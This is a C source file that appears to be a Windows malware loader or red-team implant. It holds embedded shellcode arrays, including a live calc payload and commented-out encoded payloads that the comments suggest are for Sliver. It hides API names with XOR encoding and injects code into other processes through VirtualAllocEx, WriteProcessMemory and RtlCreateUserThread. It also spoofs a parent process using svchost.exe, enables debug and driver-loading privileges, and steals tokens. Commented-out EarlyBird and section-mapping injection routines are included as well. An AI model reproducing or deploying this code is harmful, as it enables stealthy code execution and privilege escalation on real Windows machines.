#include "global.h"


BOOL getToken(HANDLE elevProc) {


	STARTUPINFOA si;
	PROCESS_INFORMATION pi;


	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));


	HANDLE tokenHandle, dupToken = NULL;



	if (!OpenProcessToken(elevProc, TOKEN_QUERY, &tokenHandle)) {
		//printf("fail");
		int lastError = GetLastError();

	}
	void* tokenUser[10240] = { 0 };
	DWORD dwTokeLen = 0;

	if (!GetTokenInformation(tokenHandle, TokenUser, NULL, dwTokeLen, &dwTokeLen));
	{
		int lastError = GetLastError();
		//printf(lastError);
		// Should be a switch, of course. Omitted for brevity
		if (lastError == ERROR_INSUFFICIENT_BUFFER)
		{
			int i = 0;
		}
	}


	WCHAR sturr[] = L"C:\\windows\\system32\\cmd.exe";
	LPWSTR app = &sturr;
	//CreateProcess(dupToken, app, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	CreateProcess(dupToken,
		app,
		NULL,
		NULL,
		FALSE,
		CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		(LPSTARTUPINFO)&si,
		&pi);
	return TRUE;

}

unsigned char payload[] = {
//  0xba, 0x15, 0x2a, 0x41, 0xa3, 0xdd, 0xc5, 0xd9, 0x74, 0x24, 0xf4, 0x5d,
//  0x2b, 0xc9, 0xb1, 0x9b, 0x83, 0xc5, 0x04, 0x31, 0x55, 0x11, 0x03, 0x55,
//  0x11, 0xe2, 0xe0, 0xf3, 0xac, 0x7a, 0x7e, 0x20, 0xdb, 0xc3, 0xbe, 0x3a,
//  0x4f, 0x58, 0x61, 0x12, 0x46, 0x11, 0x08, 0x55, 0x2f, 0x45, 0x31, 0xe1,
//  0xd8, 0xea, 0x1a, 0xe3, 0x69, 0x7d, 0x10, 0x3c, 0xe3, 0x50, 0x76, 0xee,
//  0x7e, 0x51, 0xe1, 0x92, 0x73, 0x13, 0xa8, 0xd6, 0x4c, 0xfc, 0x18, 0xa7,
//  0xac, 0xed, 0x32, 0xb6, 0xc7, 0xa0, 0x82, 0x87, 0xdd, 0xe8, 0x05, 0xb8,
//  0x49, 0x84, 0xc1, 0x5a, 0x54, 0xf3, 0x42, 0xc1, 0x4d, 0x94, 0x9a, 0xd8,
//  0x2a, 0xfa, 0xe2, 0x3d, 0x63, 0x6b, 0x4c, 0xdf, 0x82, 0xf6, 0xe8, 0x47,
//  0xa2, 0x77, 0x8f, 0x1d, 0x7f, 0xe3, 0xce, 0xb6, 0x9f, 0x38, 0xe8, 0xd7,
//  0x8a, 0x10, 0x9a, 0xf9, 0x84, 0x94, 0x0b, 0x1c, 0x0a, 0xff, 0xaf, 0x4d,
//  0xae, 0x57, 0xe5, 0xaa, 0x37, 0x36, 0x1d, 0x66, 0x7c, 0xad, 0x68, 0x78,
//  0x11, 0x75, 0x3d, 0xf8, 0xae, 0x9e, 0x13, 0xd1, 0xc6, 0xec, 0x75, 0x0f,
//  0x7b, 0xc5, 0x7f, 0x8e, 0xe3, 0x48, 0xea, 0x96, 0x61, 0x83, 0x92, 0xd2,
//  0x9a, 0x8d, 0x7a, 0x23, 0x15, 0x43, 0x75, 0xd2, 0x02, 0x17, 0x0d, 0x51,
//  0x62, 0x0b, 0x43, 0xc5, 0xf9, 0xb2, 0x45, 0x0e, 0x2c, 0xd9, 0xbb, 0xc0,
//  0x5c, 0xe9, 0x12, 0xe5, 0x66, 0x65, 0x8f, 0x99, 0xe7, 0xe6, 0x9b, 0x0a,
//  0x9f, 0x1f, 0x23, 0xd8, 0xc7, 0x6f, 0x69, 0xac, 0x84, 0xf8, 0x6e, 0xc8,
//  0x2a, 0x0a, 0x9d, 0xf6, 0x64, 0x70, 0x95, 0x9a, 0x40, 0xcb, 0xc1, 0xa5,
//  0xc9, 0x2e, 0x34, 0xf8, 0x02, 0x49, 0x42, 0xd5, 0xad, 0xe6, 0x8e, 0x3c,
//  0x74, 0xa9, 0xbf, 0xf5, 0x81, 0x3c, 0x5f, 0xd8, 0x5b, 0x46, 0x29, 0x7f,
//  0x77, 0xbb, 0x96, 0xdc, 0x0f, 0x49, 0xf6, 0xc4, 0x16, 0xca, 0x2f, 0xc4,
//  0x94, 0xd7, 0x47, 0xe4, 0x6b, 0x7c, 0x41, 0x50, 0x38, 0xb6, 0x94, 0xb5,
//  0x58, 0x81, 0x2a, 0x66, 0xd0, 0xc2, 0xea, 0x1e, 0x3c, 0x72, 0x47, 0x46,
//  0x10, 0xae, 0x86, 0xaa, 0x21, 0x7d, 0xeb, 0xfa, 0x5b, 0x82, 0xac, 0xca,
//  0x5a, 0xdf, 0xdd, 0x41, 0x94, 0x51, 0x85, 0x54, 0x3a, 0xb8, 0x1b, 0x75,
//  0x98, 0xaf, 0xc3, 0xf9, 0x42, 0xc6, 0x31, 0x8c, 0x9c, 0xa0, 0xc3, 0x25,
//  0x1f, 0x94, 0x68, 0x4d, 0xe0, 0x72, 0xe5, 0x2c, 0x31, 0x4b, 0x9d, 0xcc,
//  0x91, 0x76, 0x98, 0x28, 0x5f, 0xd6, 0x60, 0x13, 0xe7, 0xc9, 0x74, 0xeb,
//  0xf1, 0x16, 0x87, 0xce, 0x8b, 0x87, 0xb8, 0x8d, 0xb4, 0x6c, 0x26, 0xf8,
//  0xff, 0x01, 0x75, 0xf3, 0x2e, 0xa7, 0x35, 0x99, 0xb5, 0xee, 0xa2, 0x02,
//  0x99, 0x69, 0xe9, 0xae, 0xce, 0xcf, 0xfe, 0xc9, 0xac, 0xa9, 0x4c, 0xbe,
//  0x49, 0xff, 0xd5, 0x35, 0xcb, 0x61, 0xb0, 0x8c, 0xf0, 0x05, 0x29, 0x27,
//  0x85, 0xf5, 0xe2, 0x69, 0x41, 0xfd, 0x9a, 0xc0, 0x4c, 0xe7, 0xec, 0x23,
//  0x54, 0xdc, 0x34, 0x61, 0xab, 0x5e, 0x2c, 0x83, 0xae, 0xb6, 0xb0, 0xbc,
//  0x70, 0x4e, 0x26, 0x1c, 0xda, 0xc1, 0xff, 0x0e, 0x7d, 0x27, 0xff, 0xe6,
//  0x93, 0x70, 0xb2, 0xa0, 0xa4, 0xb3, 0x28, 0x70, 0x1d, 0x78, 0x88, 0x30,
//  0x9b, 0xea, 0x19, 0x1e, 0x84, 0xee, 0x98, 0x95, 0x02, 0x44, 0x90, 0xf5,
//  0xc4, 0x50, 0xef, 0x1f, 0x1a, 0x3e, 0x51, 0xde, 0xa6, 0x73, 0x0d, 0x0d,
//  0x2d, 0x54, 0x34, 0x08, 0x1f, 0xcd, 0x5b, 0xe1, 0x94, 0xda, 0x7a, 0xf7,
//  0xe8, 0x78, 0x16, 0x3e, 0xce, 0xa6, 0xb6, 0x7f, 0x39, 0x58, 0x80, 0xe0,
//  0xac, 0x20, 0x04, 0x0f, 0x5a, 0x20, 0xe6, 0x50, 0xce, 0x08, 0xe7, 0x69,
//  0xa6, 0xab, 0x49, 0x33, 0xf0, 0x56, 0x9a, 0xc5, 0x9e, 0xe7, 0x61, 0xa7,
//  0xeb, 0xe2, 0x5c, 0xc6, 0xac, 0xba, 0x02, 0xc9, 0x71, 0xde, 0x13, 0x13,
//  0x9d, 0x90, 0x66, 0xc6, 0x9d, 0xb9, 0x22, 0x52, 0xf0, 0x49, 0x05, 0x69,
//  0x65, 0x1f, 0xee, 0x46, 0x48, 0x0d, 0x12, 0x37, 0x1d, 0x07, 0x47, 0xc8,
//  0x29, 0x08, 0x9f, 0x19, 0x5e, 0x8b, 0xac, 0x36, 0x62, 0xb6, 0x08, 0x09,
//  0x3c, 0x03, 0x17, 0x2d, 0x44, 0xe9, 0x64, 0x8e, 0x1c, 0x1d, 0x9d, 0xc4,
//  0x6f, 0xbb, 0xbf, 0xfb, 0x99, 0x82, 0x82, 0x9b, 0x9a, 0xab, 0x07, 0x46,
//  0xff, 0xb8, 0xf2, 0xa8, 0xee, 0xaf, 0xd5, 0xfa, 0xdb, 0xc0, 0x81, 0xee,
//  0xfd, 0x79, 0x39, 0xdd, 0x4b, 0x52, 0x6b, 0x40, 0xcb, 0x12, 0xab, 0xef,
//  0x83, 0x20, 0x3b, 0xf6, 0x4d, 0x82, 0x2f, 0x73, 0x7e, 0x8e, 0xa4, 0x2c,
//  0x14, 0xc4, 0xc8, 0xfb, 0x6a, 0x77, 0x2b, 0x83, 0x2c, 0xc3, 0xb1, 0x59,
//  0xcc, 0x24, 0x13, 0x0b, 0xa2, 0x61, 0x7e, 0x9b, 0x45, 0x42
//};

//reggie calc

0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x48, 0x29,
0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76,
0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x01, 0xfe,
0x8b, 0x54, 0x1f, 0x24, 0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f,
0x1c, 0x48, 0x01, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
0xd7
};

//SGN encoded calc

//0xe8, 0x1d, 0x01, 0x00, 0x00, 0x50, 0xff, 0x72, 0xfa, 0x2c, 0x10, 0x70,
//0x1c, 0xa9, 0x11, 0x00, 0x80, 0xda, 0xf6, 0xff, 0xff, 0x00, 0x45, 0x30,
//0x04, 0x0c, 0x45, 0x02, 0x04, 0x0c, 0xe2, 0xf6, 0xa8, 0x43, 0xb3, 0xe3,
//0xec, 0x2c, 0xec, 0xfa, 0x37, 0x37, 0x37, 0xa7, 0xef, 0xd8, 0x1c, 0x1a,
//0xf1, 0x8d, 0xa3, 0x16, 0x0f, 0x38, 0x24, 0xbe, 0xcc, 0xa1, 0xc9, 0x55,
//0xf1, 0xd2, 0x6c, 0x4b, 0x4a, 0x4a, 0x40, 0xe5, 0x95, 0xad, 0x18, 0x59,
//0x13, 0x27, 0xa4, 0xa6, 0x2c, 0x34, 0x35, 0x45, 0xbb, 0x0b, 0x72, 0x0b,
//0x7b, 0xe8, 0x1d, 0x00, 0xde, 0xfc, 0x9a, 0x34, 0x45, 0x3f, 0xbf, 0xd2,
//0xa3, 0xd6, 0xc8, 0x68, 0xf4, 0x18, 0xb5, 0x16, 0x7f, 0x8c, 0x9b, 0x92,
//0x8d, 0x8f, 0x6e, 0x68, 0xc5, 0xa6, 0x67, 0x1b, 0x5d, 0x44, 0xb5, 0xc0,
//0x60, 0x38, 0x1e, 0x14, 0x01, 0xdc, 0xd8, 0xcf, 0xdb, 0x5b, 0xf2, 0x51,
//0xd0, 0x4f, 0x49, 0xb2, 0x74, 0x73, 0xbf, 0x1f, 0xd4, 0xa8, 0x7c, 0x5e,
//0xd5, 0x09, 0xa7, 0x1b, 0x2a, 0x76, 0x14, 0x32, 0xea, 0xd1, 0x8f, 0x62,
//0xb4, 0xf6, 0x2e, 0x80, 0x6e, 0x67, 0xd7, 0x49, 0x45, 0x03, 0x7e, 0xbe,
//0x85, 0x46, 0x7e, 0xd7, 0xd0, 0x37, 0x23, 0xf8, 0x43, 0xc8, 0xc8, 0x31,
//0x9f, 0xc7, 0x57, 0x2e, 0xda, 0xe8, 0x16, 0xc1, 0xfc, 0xd5, 0x95, 0xb5,
//0xd3, 0x8d, 0x62, 0x2d, 0xee, 0xee, 0x88, 0xef, 0x6d, 0x4f, 0x98, 0x67,
//0xdf, 0x60, 0x7b, 0x94, 0xc1, 0x1f, 0x7c, 0x69, 0x22, 0xe1, 0xde, 0x6c,
//0xd2, 0x5f, 0x5c, 0x33, 0xaf, 0x21, 0x98, 0x29, 0xfe, 0x11, 0x5d, 0xed,
//0x49, 0x57, 0x8c, 0x0d, 0xa1, 0x86, 0x19, 0xb2, 0xb2, 0x71, 0xc1, 0x31,
//0xaa, 0xd0, 0xa8, 0x38, 0xc4, 0x1d, 0x44, 0x0b, 0x6f, 0x17, 0x9c, 0x48,
//0x6c, 0x22, 0x59, 0xa5, 0x2d, 0x1e, 0x87, 0xa9, 0x5c, 0x01, 0xf7, 0x1c,
//0x1a, 0x5b, 0x2a, 0xde, 0x45, 0x1e, 0xb8, 0xa5, 0xd6, 0xd1, 0x02, 0xcb,
//0x48, 0xf5, 0xfb, 0x0b, 0x56, 0xfd, 0x82, 0x69, 0x69, 0x16, 0x5f, 0x8d,
//0x96, 0x69, 0x5a, 0x81, 0x32, 0x11, 0x4f, 0xfa, 0xb2, 0xc1, 0x4a, 0x04,
//0x34, 0xc1, 0x42, 0x08, 0xd3, 0xf7, 0x52, 0x0c, 0xff, 0xe2
//};



unsigned int payload_len = sizeof(payload);


void encryptDecryptP(char* input, char* key, size_t key_len, size_t data_len) {

	char test;
	char xormod;
	for (int i = 0; i < strlen(input); i++) {

		xormod = key[i % (key_len)];
		test = input[i] ^ xormod;
		if (test != '\0') {
			input[i] = input[i] ^ xormod;
		}
		else {
			//printf("got one %c\n", test);
		}
	}
}


BOOL(WINAPI* pVirtProt)(LPVOID lpAddr, SIZE_T dwS, DWORD flNewProt, PDWORD oldProt);
LPVOID(WINAPI* pvAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
//VOID (WINAPI * rtlMM) (_Out_ VOID UNALIGNED *Destination, _In_  const VOID UNALIGNED *Source,_In_ SIZE_T Length);
HANDLE(WINAPI* pcrThre) (
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
	);
FARPROC(WINAPI* pGetProc)(
	HMODULE a,
	LPCSTR  b
	);
LPVOID(WINAPI* pVirtualAllocEx)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

BOOL(WINAPI* pWriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
	);

DWORD(WINAPI* pRtlCreateUserThread)(
	IN HANDLE 					ProcessHandle,
	IN PSECURITY_DESCRIPTOR 	SecurityDescriptor,
	IN BOOL 					CreateSuspended,
	IN ULONG					StackZeroBits,
	IN OUT PULONG				StackReserved,
	IN OUT PULONG				StackCommit,
	IN LPVOID					StartAddress,
	IN LPVOID					StartParameter,
	OUT HANDLE 					ThreadHandle,
	OUT LPVOID					ClientID
	);



int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	BOOL bStatus = FALSE;

	pVirtualAllocEx = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "VirtualAllocEx");
	pWriteProcessMemory = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "WriteProcessMemory");
	pRtlCreateUserThread = GetProcAddress(GetModuleHandle(L"Ntdll.dll"), "RtlCreateUserThread");

	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (!pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL)) {
		return;
	}

	bStatus = (BOOL)pRtlCreateUserThread(hProc, NULL, 0, 0, 0, 0, pRemoteCode, NULL, &hThread, NULL);
	//CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, 0, 0, 0);
	if (bStatus != FALSE) {
		WaitForSingleObject(hThread, -1);
		CloseHandle(hThread);
		return 0;
	}
	else
		return -1;
}




BOOL executeSliv(HANDLE hToken) {


	if (!ImpersonateLoggedOnUser(hToken)) {
		return FALSE;
	}

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	char key[] = "WaitForSingleObject";

	char getPAddressStr[] = { 0x10, 0x4, 0x1d, 0x24, 0x34, 0x6f, 0x11, 0x12, 0xd, 0xa, 0x15, 0x9, 0x16, 0x3c, 0x0 };
	char virtAllocStr[] = { 0x1, 0x8, 0x1b, 0x74, 0x33, 0xe, 0x1e, 0x12, 0x5, 0x2, 0x8, 0xf, 0x0 };
	//char virtAllocStr[] = "VirtualAlloc";
	char virtProtStr[] = { 0x1, 0x8, 0x1b, 0x74, 0x33, 0xe, 0x1e, 0x3, 0x1b, 0x1, 0x13, 0x9, 0x6, 0x3b, 0x0 };
	char crThrStr[] = { 0x14, 0x13, 0xc, 0x15, 0x32, 0xa, 0x26, 0x3b, 0x1b, 0xb, 0x6, 0x8, 0x0 };

	encryptDecryptP((char*)getPAddressStr, key, sizeof(key), sizeof(getPAddressStr));
	pGetProc = GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), getPAddressStr);

	// Allocate buffer for payload
	//XOR((char*)virtAllocStr, strlen(virtAllocStr), key, sizeof(key));
	encryptDecryptP((char*)virtAllocStr, key, sizeof(key), sizeof(virtAllocStr));
	//GetModuleHandleW("Kernel32.dll")
	pvAlloc = pGetProc(GetModuleHandleW(L"Kernel32.dll"), virtAllocStr);

	//pvAlloc = GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "VirtualAlloc");

	exec_mem = pvAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//printf("%-20s : 0x%-016p\n", "sliver_payload addr", (void*)calc_payload);
	//printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);

	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make the buffer executable
	//XOR((char*)virtProtStr, strlen(virtProtStr), key, sizeof(key));
	encryptDecryptP((char*)virtProtStr, key, sizeof(key), sizeof(virtProtStr));
	pVirtProt = pGetProc(GetModuleHandleW(L"kernel32.dll"), virtProtStr);
	rv = pVirtProt(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);


	//printf(baseStr);
	// If all good, run the payload
	if (rv != 0) {

		encryptDecryptP((char*)crThrStr, key, sizeof(key), sizeof(crThrStr));
		pcrThre = pGetProc(GetModuleHandleW(L"kernel32.dll"), crThrStr);
		th = pcrThre(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return TRUE;

}



HANDLE fatToke = NULL;

BOOL elevateNInject( HANDLE parentProc,HANDLE debugPp) {

	SIZE_T size = 0x30;

	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&si, sizeof(si));
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);

	if (size > 1024) { return FALSE; }

	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);
	if (!si.lpAttributeList) { return FALSE; }

	if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) { return FALSE; }
	if (!UpdateProcThreadAttribute(si.lpAttributeList, 0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProc, sizeof(HANDLE), 0, 0)) //-V616
	{
		return FALSE;
	}
	si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	si.StartupInfo.wShowWindow = SW_SHOW;
	//L"C:\\Windows\\System32\\appverif.exe";
	//L"C:\\Windows\\System32\\eudcedit.exe";
	//L"C:\\Windows\\System32\\fodhelper.exe"
	wchar_t payload[] = L"C:\\Windows\\System32\\svchost.exe";
	if (!CreateProcess(NULL,
		payload,
		NULL,
		NULL,
		TRUE,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_PROCESS_GROUP | CREATE_SUSPENDED,
		NULL,
		NULL,
		(LPSTARTUPINFO)&si,
		&pi))
	{
		return FALSE;
	}




	//Duplicate Process token and use to wreak havoc
	//***************************************************************
	//***************************************************************


	HANDLE token;


	if (!OpenProcessToken(pi.hProcess, TOKEN_ALL_ACCESS, &token))
	{
		return FALSE;
	}

	int privCount = 7;

	PRIVARR tp;
	tp.PrivilegeCount = privCount;
	LUID luid;

	DWORD dError;

	wchar_t* privs[7] = { '\0' };
	privs[0] = L"SeDebugPrivilege";
	privs[1] = L"SeLoadDriverPrivilege";
	privs[2] = L"SeTakeOwnershipPrivilege";
	privs[3] = L"SeBackupPrivilege";
	privs[4] = L"SeImpersonatePrivilege";
	privs[5] = L"SeIncreaseQuotaPrivilege";
	privs[6] = L"SeAssignPrimaryTokenPrivilege";

	//enablePrivs(dupToken, privCount, privs);

	for (int i = 0; i < privCount; i++) {
		if (!LookupPrivilegeValue(
			NULL,            // lookup privilege on local system
			privs[i],   // privilege to lookup 
			&luid))        // receives LUID of privilege
		{
			return FALSE;
		}

		tp.Privileges[i].Luid = luid;
		tp.Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;

	}

	if (!AdjustTokenPrivileges(
		token,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))

	{
		return FALSE;
	}

	HANDLE dupToken = NULL;
	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &dupToken))
	{
		return FALSE;
	}
	if (!SetThreadToken(NULL, dupToken)) {

		return FALSE;
	}


	HANDLE hProc = pi.hProcess;
	//classicInject(hProc, 106);
	classicInject(hProc, 105);


	//spoofParent(hProc);

	//TerminateProcess(parentProc, 0);
	//TerminateProcess(pi.hProcess, 0);
	//spoofParent(pi.hProcess);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	NtClose(parentProc);
	parentProc = NULL;
	NtClose(debugPp);
	debugPp = NULL;

	//if (si.lpAttributeList)
	//	DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

	//supHeapFree(si.lpAttributeList);

	return TRUE;
}

BOOL spoofParent(HANDLE parent) {


	HANDLE dupHandle = NULL;
	NtDuplicateObject(parent,
		NtCurrentProcess(),
		NtCurrentProcess(),
		&dupHandle,
		PROCESS_ALL_ACCESS,
		0,
		0);

	SIZE_T size = 0x30;
	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&si, sizeof(si));
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);

	if (size > 1024) { return FALSE; }

	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);

	if (!si.lpAttributeList) { return FALSE; }

	if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) { return FALSE; }
	if (!UpdateProcThreadAttribute(si.lpAttributeList, 0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &dupHandle, sizeof(HANDLE), 0, 0)) //-V616
	{
		return FALSE;
	}
	si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	si.StartupInfo.wShowWindow = SW_SHOW;
	wchar_t payload[] = L"C:\\Windows\\System32\\svchost.exe";
	if (!CreateProcess(NULL,
		payload,
		NULL,
		NULL,
		TRUE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		(LPSTARTUPINFO)&si,
		&pi))
	{
		return FALSE;
	}

	//classicInject(pi.hProcess, hModule);

	//if (si.lpAttributeList)
	//	DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

	//supHeapFree(si.lpAttributeList);
}


BOOL classicInject(HANDLE hProc,int resource) {

	//"C:\Users\d\MIDNIGHTTRAIN\Bin\gargoyle_x64.bin"
	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	BOOL bStatus = FALSE;

	

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;

	unsigned char* payload1;
	unsigned int payload1_len;

	//// Extract payload from resources section
	//res = FindResource(NULL, MAKEINTRESOURCE(105), L"BIN");
	//resHandle = LoadResource(NULL, res);
	//payload1 = (unsigned char*)LockResource(resHandle);

	//payload1_len = SizeofResource(NULL, res);

	res = FindResource(g_hInstance, MAKEINTRESOURCE(resource), L"BIN"); // substitute RESOURCE_ID and RESOURCE_TYPE.



	resHandle = LoadResource(g_hInstance, res);
	payload1 = (unsigned char*)LockResource(resHandle);

	payload1_len = SizeofResource(g_hInstance, res);





	pVirtualAllocEx = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "VirtualAllocEx");
	pWriteProcessMemory = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "WriteProcessMemory");
	pRtlCreateUserThread = GetProcAddress(GetModuleHandle(L"Ntdll.dll"), "RtlCreateUserThread");

	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload1_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (!pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload1, (SIZE_T)payload1_len, (SIZE_T*)NULL)) {
		return FALSE;
	}

	bStatus = pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, &hThread, NULL);

	if (bStatus != FALSE) {
		WaitForSingleObject(hThread, -1);
		CloseHandle(hThread);
		return 0;
	}
	else
		return FALSE;

}

/*

// EarlyBird injection
BOOL earlybird (HANDLE hProc) {

	int pid = 0;


	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	void* pRemoteCode;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	//CreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

	// Decrypt and inject payload
	//AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));

	// Allocate memory for payload and throw it in
	pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

	QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);

	ResumeThread(pi.hThread);

	return 0;
}


typedef LPVOID(WINAPI* VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);

typedef VOID(WINAPI* RtlMoveMemory_t)(
	VOID UNALIGNED* Destination,
	const VOID UNALIGNED* Source,
	SIZE_T Length);

typedef FARPROC(WINAPI* RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


typedef NTSTATUS(NTAPI* NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL);

typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);


// map section views injection
int InjectVIEW(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {



	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	// create memory section
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateSection");
	if (pNtCreateSection == NULL)
		return -2;
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create local section view
	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtMapViewOfSection");
	if (pNtMapViewOfSection == NULL)
		return -2;
	pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T*)&payload_len, ViewUnmap, NULL, PAGE_READWRITE);

	// throw the payload into the section
	memcpy(pLocalView, payload, payload_len);

	// create remote section view (target process)
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T*)&payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

